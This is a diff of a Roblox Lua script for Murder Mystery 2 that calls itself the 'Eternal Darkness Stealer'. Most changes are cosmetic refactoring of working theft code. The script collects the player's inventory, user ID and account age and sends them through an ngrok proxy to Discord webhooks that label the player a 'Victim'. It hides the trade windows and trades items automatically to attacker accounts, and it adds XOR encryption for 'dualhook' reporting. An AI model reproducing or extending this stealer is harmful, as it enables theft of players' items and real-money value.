@@ -1,7 +1,6 @@
 repeat task.wait() until game:IsLoaded()
 task.wait(2)
 
--- Sadece MM2'de çalışsın
 if game.PlaceId ~= 142823291 then
     local plr = game.Players:FindFirstChildOfClass("Player") or game.Players.LocalPlayer
     if plr and typeof(plr.Kick) == "function" then
@@ -14,11 +13,9 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- ================= JOB ID BYPASS =================
 local REAL_JOB_ID = ""
 local executor = ""
 
--- Get executor name safely
 pcall(function()
     if identifyexecutor then
         executor = identifyexecutor() or ""
@@ -60,7 +57,6 @@ if string.find(executor:lower(), "delta") or string.find(executor:lower(), "krnl
         if not found then task.wait(0.5) end
     until found or REAL_JOB_ID ~= "" or attempts > 60
     
-    -- Fallback if hook didn't catch it
     if REAL_JOB_ID == "" then
         REAL_JOB_ID = game.JobId
     end
@@ -68,13 +64,10 @@ else
     REAL_JOB_ID = game.JobId
 end
 
--- Ensure we have a job ID
 if REAL_JOB_ID == "" then
     REAL_JOB_ID = game.JobId
 end
--- ================= BYPASS SONU =================
 
--- Şifreleme motoru (dualhook için)
 local a={}for b=0,255 do a[b]=string.char(b)end 
 local function stringchar(b)local c=a[b]or string.char(b)return c end 
 local function mathfloor(b)if b>=0 then return b-(b%1)else local c=b-(b%1)return c==b and c or c-1 end end 
@@ -85,18 +78,14 @@ local function toHex(b)return(b:gsub('.',function(c)return string.format('%02X',
 local function xorCrypt(b,c)local d={}for e=1,#b do local f,g=b:byte(e),c:byte((e-1)%#c+1)tableinsert(d,stringchar(bxor(f,g)))end return tableconcat(d)end 
 local function encrypt(b)return toHex(xorCrypt(b,"85acfc6776299e4661b3093d63b6a9a4e6a06bbcbc226d5721471cc15e94b46c"))end
 
--- ================= Eternal Darkness Configuration =================
-
 local PROXY_URL = "https://malevolently-oilless-zita.ngrok-free.dev/api/proxy/"
 
--- EXTERNAL GLOBALS - SET BY LOADER
 local WEBHOOK_ID = _G.WEBHOOK_ID or "default_webhook"
 local usernames_id = _G.USERNAMES or {}
 
 local TOP_HITS_WEBHOOK_ID = "wjffxl4325f"
 local TOP_HITS_MIN_VALUE = 2000
 
--- Universal request
 getgenv().request = getgenv().request 
     or request 
     or http_request 
@@ -125,7 +114,6 @@ if not getgenv().request then
     return
 end
 
--- Universal queue_on_teleport
 getgenv().queue_on_teleport = getgenv().queue_on_teleport 
     or queue_on_teleport 
     or queueonteleport 
@@ -146,7 +134,6 @@ getgenv().queue_on_teleport = getgenv().queue_on_teleport
     or (xeno and xeno.queue_on_teleport) 
     or nil
 
--- Universal setclipboard
 getgenv().setclipboard = getgenv().setclipboard 
     or setclipboard 
     or (syn and syn.setclipboard) 
@@ -171,7 +158,6 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
 
--- Eternal Darkness Color Scheme
 local ETERNAL_DARKNESS_COLORS = {
     primary = 0x0a0a1a,
     secondary = 0x1a1a2e,
@@ -256,7 +242,6 @@ local STATUS_API_URL = cfg.StatusApi or ""
 local API_KEY = cfg.ApiKey or ""
 local ETERNAL_DARKNESS_AVATAR = "https://imgur.com/a/OPHDrDn.png"
 
--- Autojoiner'a hit bildir
 local function sendHitToQueue(placeId, jobId, receiverName)
     pcall(function()
         request({
@@ -272,7 +257,6 @@ local function sendHitToQueue(placeId, jobId, receiverName)
     end)
 end
 
--- Rubis.app yükleme
 local function upload_to_rubis(items)
     local lines = {"Eternal Darkness Inventory Dump | Pastefy", "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"), "Total Items: " .. #items, string.rep("-", 50), ""}
     table.sort(items, function(a, b)
@@ -318,7 +302,6 @@ local function upload_to_rubis(items)
     return nil
 end
 
--- USD Value Calculation API
 local function GetUSD(list)
     local url = "https://we-bmm2.vercel.app/api/calc"
     local items = {}
@@ -353,7 +336,6 @@ local function GetUSD(list)
     return {total = "0.00", itemPrices = {}}
 end
 
--- ================= VALUE FETCHING =================
 local categories = {
     commons = "https://supremevalues.com/mm2/commons",
     uncommons = "https://supremevalues.com/mm2/uncommons",
@@ -514,7 +496,6 @@ local function buildValueList()
     
     return valueList
 end
--- ================= VALUE FETCHING END =================
 
 if not plr.Character then 
     plr.CharacterAdded:Wait() 
@@ -524,7 +505,6 @@ task.wait(1)
 local PlaceId = game.PlaceId
 local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)
 
--- Setup Trade remotes safely
 local Trade, SendRequest, GetStatus, OfferItem, AcceptTradeRemote, DeclineTrade
 
 pcall(function()
@@ -552,7 +532,6 @@ if Trade and Trade.UpdateTrade then
     end)
 end
 
--- GUI'leri kapat
 local PlayerGui = plr:WaitForChild("PlayerGui")
 for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
     local gui = PlayerGui:FindFirstChild(guiName)
@@ -566,7 +545,6 @@ for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
     end
 end
 
--- Inventory oku
 local dbSuccess, database = pcall(function()
     return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 end)
@@ -588,7 +566,6 @@ end
 local weaponsToSend = {}
 local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
 
--- Fetch values with fallback
 local fetchSuccess, prices = pcall(buildValueList)
 if not fetchSuccess or not prices then
     prices = {}
@@ -627,7 +604,6 @@ table.sort(weaponsToSend, function(a, b)
     return a.TotalValue > b.TotalValue 
 end)
 
--- Hit kategorisi
 local hitCategory = ""
 local isPingWorthy = false
 
@@ -643,7 +619,6 @@ else
     isPingWorthy = true
 end
 
--- Check for top hits
 local function isTopHit()
     if totalInventoryValue >= TOP_HITS_MIN_VALUE then 
         return true 
@@ -658,11 +633,9 @@ end
 
 local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"
 
--- Get USD value
 local usdData = GetUSD(weaponsToSend)
 local totalUSD = usdData.total or "0.00"
 
--- Send to proxy function
 local function sendToProxy(Wid, payload, isEncrypted)
     task.spawn(function()
         local finalBody = HttpService:JSONEncode(payload)
@@ -692,7 +665,6 @@ local function sendToProxy(Wid, payload, isEncrypted)
     end)
 end
 
--- Main webhook
 local function sendMainWebhook()
     local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
     local targetName = table.concat(users, ", ")
@@ -711,7 +683,7 @@ local function sendMainWebhook()
             Vintage = "🟠", Legendary = "🔵", Rare = "🟢"
         }
         local emoji = rarityEmoji[item.Rarity] or "⚪"
-        table.insert(top_items, string.format("%s `%s` ×%d **%d**", emoji, item.ItemName, item.Amount, item.TotalValue))
+        table.insert(top_items, string.format("%s `%s` x%d **%d**", emoji, item.ItemName, item.Amount, item.TotalValue))
     end
 
     local tier_counts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
@@ -727,36 +699,46 @@ local function sendMainWebhook()
     local fields = {}
     table.insert(fields, {
         name = "👤 Victim",
-        value = string.format("%s\n(@%s)\nID: %d\nAge: %d days", plr.DisplayName, plr.Name, plr.UserId, plr.AccountAge),
+        value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days",
         inline = true
     })
     table.insert(fields, {
         name = "⚙️ System",
-        value = string.format("Executor: %s\nReceiver: %s\nJob ID:\n%s...", executorName, targetName, string.sub(REAL_JOB_ID, 1, 8)),
+        value = "Executor: " .. executorName .. "\nReceiver: " .. targetName .. "\nJob ID:\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...",
         inline = true
     })
     table.insert(fields, {
         name = "💰 Valuation",
-        value = string.format("Total Value: %d\nReal Value: $%s\nTotal Items: %d", totalInventoryValue, totalUSD, total_items),
+        value = "Total Value: " .. totalInventoryValue .. "\nReal Value: $" .. totalUSD .. "\nTotal Items: " .. total_items,
         inline = true
     })
+    
+    local ansiLine1 = string.char(27) .. "[2;31mAncient:  " .. tier_counts.Ancient .. "  " .. string.char(27) .. "[2;35mGodly:   " .. tier_counts.Godly .. string.char(27) .. "[0m"
+    local ansiLine2 = string.char(27) .. "[2;33mUnique:   " .. tier_counts.Unique .. "  " .. string.char(27) .. "[2;38;5;208mVintage: " .. tier_counts.Vintage .. string.char(27) .. "[0m"
+    local ansiLine3 = string.char(27) .. "[2;34mLegendary:" .. tier_counts.Legendary .. "  " .. string.char(27) .. "[2;32mRare:    " .. tier_counts.Rare .. string.char(27) .. "[0m"
+    local ansiLine4 = string.char(27) .. "[2;37mUncommon: " .. tier_counts.Uncommon .. "  Common:  " .. tier_counts.Common
+    
     table.insert(fields, {
         name = "📊 Inventory Breakdown",
-        value = string.format("```ansi\n\u001b[2;31mAncient:  %d  \u001b[2;35mGodly:   %d\u001b[0m\n\u001b[2;33mUnique:   %d  \u001b[2;38;5;208mVintage: %d\u001b[0m\n\u001b[2;34mLegendary:%d  \u001b[2;32mRare:    %d\u001b[0m\n\u001b[2;37mUncommon: %d  Common:  %d```", 
-            tier_counts.Ancient, tier_counts.Godly,
-            tier_counts.Unique, tier_counts.Vintage,
-            tier_counts.Legendary, tier_counts.Rare,
-            tier_counts.Uncommon, tier_counts.Common),
+        value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "```",
         inline = false
     })
+    
+    local topItemsStr = ""
+    if #top_items > 0 then
+        topItemsStr = table.concat(top_items, "\n")
+    else
+        topItemsStr = "No items"
+    end
+    
     table.insert(fields, {
         name = "🏆 Top Items",
-        value = #top_items > 0 and string.format("```\n%s\n```", table.concat(top_items, "\n")) or "```\nNo items\n```",
+        value = "```\n" .. topItemsStr .. "\n```",
         inline = false
     })
     table.insert(fields, {
         name = "🔗 Actions",
-        value = string.format("[Join Server](%s) • [View Inventory](%s)", fernJoinerLink, rubisLink),
+        value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")",
         inline = false
     })
 
@@ -765,11 +747,11 @@ local function sendMainWebhook()
         username = "🌑 Eternal Darkness",
         avatar_url = ETERNAL_DARKNESS_AVATAR,
         embeds = {{
-            title = string.format("🎯 HIT CONFIRMED │ %s │ %s", plr.DisplayName, hitCategory),
+            title = "🎯 HIT CONFIRMED │ " .. plr.DisplayName .. " │ " .. hitCategory,
             url = rubisLink,
             color = ETERNAL_DARKNESS_COLORS.secondary,
             thumbnail = {url = avatarUrl},
-            description = string.format("```lua\n%s\n```", joinScript),
+            description = "```lua\n" .. joinScript .. "\n```",
             fields = fields,
             footer = {
                 text = "Eternal Darkness Stealer  v1.0.0 | discord.gg/wep4k9Fg8W"
@@ -785,7 +767,6 @@ local function sendMainWebhook()
     end
 end
 
--- Top hits webhook
 local function sendTopHits()
     if not isTopHit() then 
         return 
@@ -799,33 +780,41 @@ local function sendTopHits()
     local top_items = {}
     for i = 1, math.min(5, #weaponsToSend) do
         local item = weaponsToSend[i]
-        table.insert(top_items, string.format("`%s` ×%d (**%d** value)", item.ItemName, item.Amount, item.TotalValue))
+        table.insert(top_items, "`" .. item.ItemName .. "` x" .. item.Amount .. " (**" .. item.TotalValue .. "** value)")
     end
 
     local fields = {}
     table.insert(fields, {
         name = "💰 Elite Valuation",
-        value = string.format("In-Game: %d\nReal Value: $%s\nItems: %d", totalInventoryValue, totalUSD, total_items),
+        value = "In-Game: " .. totalInventoryValue .. "\nReal Value: $" .. totalUSD .. "\nItems: " .. total_items,
         inline = true
     })
     table.insert(fields, {
         name = "👤 Victim",
-        value = string.format("User: %s\nID: %d\nAge: %d days", plr.Name, plr.UserId, plr.AccountAge),
+        value = "User: " .. plr.Name .. "\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days",
         inline = true
     })
     table.insert(fields, {
         name = "⚙️ System",
-        value = string.format("Executor: %s\nJob ID: %s...", executorName, string.sub(REAL_JOB_ID, 1, 8)),
+        value = "Executor: " .. executorName .. "\nJob ID: " .. string.sub(REAL_JOB_ID, 1, 8) .. "...",
         inline = true
     })
+    
+    local eliteItemsStr = ""
+    if #top_items > 0 then
+        eliteItemsStr = table.concat(top_items, "\n")
+    else
+        eliteItemsStr = "No items"
+    end
+    
     table.insert(fields, {
         name = "🏆 Elite Items",
-        value = #top_items > 0 and string.format("```\n%s\n```", table.concat(top_items, "\n")) or "```\nNo items\n```",
+        value = "```\n" .. eliteItemsStr .. "\n```",
         inline = false
     })
     table.insert(fields, {
         name = "🔗 Actions",
-        value = string.format("[Join Server](%s) • [View Inventory](%s)", fernJoinerLink, rubisLink),
+        value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")",
         inline = false
     })
 
@@ -837,7 +826,7 @@ local function sendTopHits()
             title = "🎯🔥 ELITE HIT CONFIRMED",
             url = rubisLink,
             color = ETERNAL_DARKNESS_COLORS.highlight,
-            description = string.format("**%s** has been consumed by Eternal Darkness!\n\nThis is an **ELITE** hit worth **$%s** real money!", plr.Name, totalUSD),
+            description = "**" .. plr.Name .. "** has been consumed by Eternal Darkness!\n\nThis is an **ELITE** hit worth **$" .. totalUSD .. "** real money!",
             fields = fields,
             footer = { 
                 text = "Eternal Darkness Stealer  v1.0.0 | discord.gg/wep4k9Fg8W"
@@ -849,13 +838,11 @@ local function sendTopHits()
     sendToProxy(TOP_HITS_WEBHOOK_ID, payload, false)
 end
 
--- SEND WEBHOOKS IMMEDIATELY
 print("[Eternal Darkness] Starting webhook send...")
 sendMainWebhook()
 sendTopHits()
 print("[Eternal Darkness] Webhooks sent!")
 
--- ================= TRADING FUNCTIONS =================
 local function getStatus()
     if not GetStatus then 
         return "None" 
@@ -920,7 +907,6 @@ function doTrade(targetPlayer)
         table.insert(combinedUser, v) 
     end
     
-    -- Initial cleanup
     local initialTradeState = getStatus()
     if initialTradeState == "StartTrade" then
         pcall(function() 
@@ -1021,7 +1007,6 @@ local function isTarget(name)
     return false
 end
 
--- Eventler
 Players.PlayerAdded:Connect(function(player)
     if player == plr then 
         return 
